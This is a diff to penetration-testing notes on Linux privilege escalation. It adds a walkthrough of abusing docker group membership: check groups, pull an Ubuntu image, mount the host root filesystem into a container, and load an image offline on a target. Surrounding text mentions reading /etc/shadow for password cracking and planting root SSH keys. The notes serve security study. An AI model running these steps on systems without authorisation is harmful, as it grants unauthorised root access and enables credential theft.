@@ -655,6 +655,57 @@ Users within the disk group have full access to any devices contained within `/d
 
 Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
 
+#### Check the membership&#x20;
+
+{% code overflow="wrap" %}
+```bash
+id
+groups
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1871).png" alt=""><figcaption></figcaption></figure>
+
+#### Pull an image&#x20;
+
+{% hint style="info" %}
+_This needs to be done if you don't have the zip file of any docker image._&#x20;
+{% endhint %}
+
+{% code overflow="wrap" %}
+```bash
+docker image ls
+docker pull ubuntu:20.04
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1872).png" alt=""><figcaption></figcaption></figure>
+
+#### Mount root directory&#x20;
+
+{% code overflow="wrap" %}
+```bash
+docker run --rm -it -v /:/mnt ubuntu:20.04 bash
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1873).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_You can see that we can access the high privileged files contents and all the things that a root user can access._&#x20;
+{% endhint %}
+
+#### tar file&#x20;
+
+We need tar file in case we didn't have internet access on the machine for pulling a docker.&#x20;
+
+{% file src="../../.gitbook/assets/ubuntu20.tar" %}
+
+On the target:&#x20;
+
+* `docker load -i ubuntu20.tar`
+* `docker image ls`
+
 ### LXD Group Abuse
 
 #### 1. Check if you're part of LXD group&#x20;
